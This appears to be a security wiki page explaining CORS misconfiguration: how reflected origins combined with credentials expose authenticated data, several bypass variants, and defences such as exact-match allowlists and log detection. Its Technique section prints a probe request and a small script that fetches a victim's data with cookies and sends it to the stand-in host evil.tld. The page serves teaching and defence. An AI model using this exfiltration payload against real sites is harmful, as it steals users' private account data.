---
title: CORS misconfiguration
slug: cors-misconfig
---

> **TL;DR:** When `Access-Control-Allow-Origin` reflects the attacker's `Origin` and `Allow-Credentials: true` is set, any victim browser fetches authenticated data and hands it to attacker JS.

## What it is
The CORS spec lets servers opt-in to cross-origin reads beyond the same-origin policy. Servers indicate which origins may read responses via `Access-Control-Allow-Origin` (ACAO). When the server also sets `Access-Control-Allow-Credentials: true`, the browser will include cookies and HTTP auth on the cross-origin request and expose the body to the calling script. A naive implementation that echoes the request `Origin` into ACAO breaks the security model entirely.

## Preconditions / where it applies
- API or web app reachable from a victim's authenticated browser.
- Server reflects `Origin` or accepts `null` / `*` with credentials, or has a sloppy regex that matches `attacker.target.com.evil.tld`.
- Endpoint returns sensitive data on a simple GET (or supports preflight for state-changing methods).

## Technique
Quickly probe with curl using a controlled Origin:

```http
GET /api/me HTTP/1.1
Host: target.com
Origin: https://evil.tld
Cookie: session=...
```

Vulnerable response:

```http
Access-Control-Allow-Origin: https://evil.tld
Access-Control-Allow-Credentials: true
```

Then host an exfil page:

```html
<script>
fetch('https://target.com/api/me', { credentials: 'include' })
  .then(r => r.text())
  .then(b => navigator.sendBeacon('https://evil.tld/c', b));
</script>
```

Common variants:

- **Null origin** — `Origin: null` is sent by sandboxed iframes, data: URLs, and some redirects; if the server allows it with credentials, the attacker hosts a sandboxed iframe.
- **Suffix regex** — `^https?://.*\.target\.com$` accepts `https://evil.target.com.attacker.tld`.
- **Pre-prod trust** — staging origins (`*.dev.target.com`) trusted by prod APIs with shared cookies.
- **HTTP -> HTTPS allow** — mixed scheme allow lets a network attacker on HTTP poison and exfil.
- **Trailing-dot / case** — `https://target.com.` may bypass equality checks.

Without `Allow-Credentials`, you still read public endpoints — useful for internal APIs reachable from corporate intranets via DNS rebinding ([[dns-rebinding]]) or for SSRF amplification ([[ssrf]]).

## Detection and defence
- Hard-allowlist of origins; never reflect the request `Origin` verbatim. Compare with exact-match string equality.
- Refuse `null` origin with credentials.
- Pair CORS with `Vary: Origin` so caches do not serve one origin's response to another (otherwise [[cache-poisoning]]).
- Do not send sensitive data on simple requests — require a custom header (`X-Requested-With`) that forces preflight.
- Logs: spike in 200s with attacker origins, or many distinct origins on the same session cookie.

## References
- [PortSwigger – CORS](https://portswigger.net/web-security/cors) — primer and labs
- [Fetch Standard – CORS protocol](https://fetch.spec.whatwg.org/#http-cors-protocol) — normative spec
- [HackTricks – CORS bypass](https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html) — collected misconfig patterns
